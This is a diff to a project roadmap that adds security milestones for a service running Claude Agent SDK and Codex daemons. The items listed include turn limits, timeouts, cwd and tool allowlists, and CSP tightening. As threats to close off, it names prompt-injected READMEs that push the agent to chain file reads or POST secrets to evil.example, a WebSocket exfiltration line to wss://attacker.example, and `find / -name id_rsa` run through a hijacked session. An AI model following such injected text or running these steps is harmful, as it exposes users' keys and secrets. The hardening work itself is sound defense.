@@ -118,6 +118,40 @@ audit before opening up CLI-driven onboarding.
 After M4.6, the install-script milestone (GoReleaser + curl|sh / iwr|iex)
 can land safely.
 
+### M4.7 — Token-budget defense + second-round audit fixes
+
+Tier-1 follow-up to a token-budget threat model. The audit listed ~30
+items; this milestone ships the six with the highest impact-to-effort
+ratio. Rest deferred to **Milestone 10**.
+
+- **B-2** Claude Agent SDK runs with `maxTurns: 25` per prompt. Hard cap
+  on tool-use chains — defense against prompt-injection-driven fanout
+  (e.g. a hostile README that tricks Claude into 200 chained file reads)
+  and against runaway agent loops chewing through tokens. 25 is plenty
+  for normal coding tasks (most resolve in <10).
+- **B-3** Daemon-side wall-clock cap on a single run via
+  `context.WithTimeout(defaultMaxRunDuration)` (30 min, overridable via
+  `VVIBE_MAX_RUN_SECONDS`). Backstops the "tab went to sleep but the
+  agent kept looping" case. `daemon_done` reports the timeout with a
+  readable message instead of `context deadline exceeded`.
+- **O-3** "Stop all (N)" emergency-brake button appears in the sidebar
+  whenever ≥1 session is `running` or `awaiting_permission`. Server-side
+  `cancel_all` message iterates `store.listForUser(userId)` and calls
+  `.cancel()` on each active session. One click brake for "I think
+  something's wrong" without hunting through individual sessions.
+- **N-1** Cross-tenant guard on `pendingDirListings`. Map now keys on
+  `(requestId, userId)` so a malicious user's daemon can't brute-force
+  the 6-char requestId space and inject directory entries into another
+  user's picker.
+- **N-3** Install script substitution uses `PUBLIC_URL` instead of
+  `req.get('host')`. Host is attacker-controllable in principle, and a
+  quote/newline in it would break out of the single-quoted shell/PS
+  string in install.sh/.ps1 — at minimum a supply-chain-style trust
+  assumption we don't need.
+- **N-8** `GET /auth/logout` removed; only POST remains. Eliminates
+  `<img src=".../logout">` CSRF nuisance from third-party pages.
+  Frontend now POSTs via `fetch` and navigates to `/`.
+
 ### M4.8 — One-line daemon installer + CLI rename to `vvibe`
 
 GoReleaser config (`client-go/.goreleaser.yaml`) builds the daemon for
@@ -273,6 +307,104 @@ sibling machine has no path to the daemon.
   Fly's HTTP-based affinity doesn't carry into long-lived WS, and
   daemon connection isn't tied to a browser session anyway.
 - **P2** Until that lands, do not raise `min_machines_running`.
+
+### Milestone 10 — Token budget & deeper defense (deferred from M4.7)
+
+**Why:** M4.7 shipped the six highest-leverage items from a token-budget
+threat model + second-round security audit. The rest below — observability,
+per-user quotas, daemon-side belt-and-braces, supply-chain hardening — are
+the medium-complexity / longer-tail items from that same audit. Some land
+in adjacent milestones (e.g. cwd allowlist sits between this and M6).
+
+#### Observability + user-visible budget
+
+- **P0** **O-1 / O-2** Per-session token + cost counting. Claude Agent
+  SDK's `result` message carries `usage` and `total_cost_usd`; pipe it
+  through `daemon_done` and accumulate on `Session`. Add a user setting
+  "daily budget $X" — soft warning at 80%, server-side hard refusal at
+  100% (must explicitly raise to continue). Codex CLI doesn't surface
+  usage today, so it falls back to a prompts/day quota.
+- **P1** **O-5** Audit log UI: "Last 30 days" page listing prompt time,
+  cwd, token/cost, device, IP. We already store `agent_sessions` +
+  `agent_messages`; this is mostly read-side.
+- **P2** **O-4** Anomalous-activity detector + forced re-OAuth (IP
+  country jump, UA flip, prompt rate ≫ historical baseline). Needs the
+  `auth_events` table first.
+
+#### Per-user rate limiting
+
+- **P0** **B-5** WebSocket rate limit. HTTP endpoints have one, WS
+  `send_prompt` doesn't. Per-(userId, sessionId) token bucket, ~10/min.
+- **P1** **B-1** `quota_events` table for per-user/session/day prompt
+  caps. Cheap window query before each `enqueuePrompt`.
+- **P2** **B-4** Cancel watchdog — re-evaluate after B-3 has been live
+  for a while. If zombie runs persist past `cancel()` we add a 5s
+  deadline + force-kill; otherwise skip.
+
+#### Defense in depth
+
+- **P0** **N-6** zod schema for `daemon_message` / `daemon_done`. Even
+  a user's own malicious daemon can spoof `role: 'user'` to inject fake
+  history rows; the JSON shape is currently trust-on-faith.
+- **P1** **N-2** Tighten CSP `connect-src` from `ws:`/`wss:` (host
+  wildcard) to `'self'`. Closes any future XSS → data exfil via
+  `new WebSocket('wss://attacker.example/')`.
+- **P1** **N-5** Origin middleware: refuse requests with no Origin
+  header on state-changing endpoints (allowlist daemon endpoints
+  separately). Today undefined Origin is permitted as a permissive
+  default.
+- **P1** **D-1** Daemon-side `budget.json` (per-hour prompts, per-run
+  duration, daily soft/hard cap in USD). Daemon enforces independently
+  of the server — even if our server is compromised, the user can't be
+  billed past their local cap. The "we can't bill you past your local
+  cap" story is also a marketing differentiator.
+- **P2** **D-2** `vvibe usage` CLI: prints today's local-tracked
+  spend regardless of server state. Side benefit of D-1.
+- **P2** **L-7** Codex daemon: require `CODEX_ARGS` to contain
+  `--sandbox` (and ideally `--ask-for-approval`) when
+  `CODEX_TRUST_DEFAULTS=1`. Today setting trust-defaults without those
+  args silently degrades to full-auto.
+
+#### Tool / cwd scoping
+
+- **P0** **H-3** Daemon cwd allowlist. `vvibe allow ~/code` adds a
+  permitted root; daemon refuses any `cwd` outside the union of allowed
+  roots. Closes "attacker hijacks session → `find / -name id_rsa`"
+  paths. Bigger feature: needs CLI subcommand, config file format,
+  startup-time validation, UI hint when a session targets a denied
+  cwd.
+- **P1** **P-5** Per-session tool allowlist. `NewSessionDialog`
+  exposes a checkbox list; SDK takes `allowedTools`. Defaults to
+  Read/Edit/Bash; WebFetch/WebSearch require an explicit opt-in. Cuts
+  off "injected README tells Claude to POST secrets to evil.example"
+  at the tool layer.
+- **P2** **P-3** `cwd` change requires modal confirm (changing cwd =
+  changing prompt-injection surface).
+
+#### Onboarding + comms
+
+- **P2** **A-1** Onboarding screen / docs: link to Anthropic Console
+  → Settings → Monthly spend limit as the last-resort backstop. Pure
+  docs.
+- **P2** **A-4** Event push: "daily token total reached $X", "login
+  from a new IP/UA", "daemon budget tripped". Start with in-UI banner;
+  email later.
+
+#### Supply chain (sits with M6)
+
+- **R**  **N-4** Release trust root. `vvibe upgrade` currently trusts
+  whoever can push to GitHub Releases. Add protected branches, OIDC +
+  Sigstore/cosign, fine-grained PATs. Code-signing (already M6 P1) is
+  the upstream half.
+
+#### Won't do / consciously skipped
+
+- **P-1** "User must be active in last N min to send prompt." Adds
+  complexity; B-* gates cover the same threat model with less UX cost.
+- **N-7** Pair-lookup info leak (any authed user can probe a code's
+  device name). Pair codes are short-lived; signal value is low.
+- **L-1 to L-6** Batched into a future "polish" cycle, not action-
+  worthy on their own.
 
 ---
 
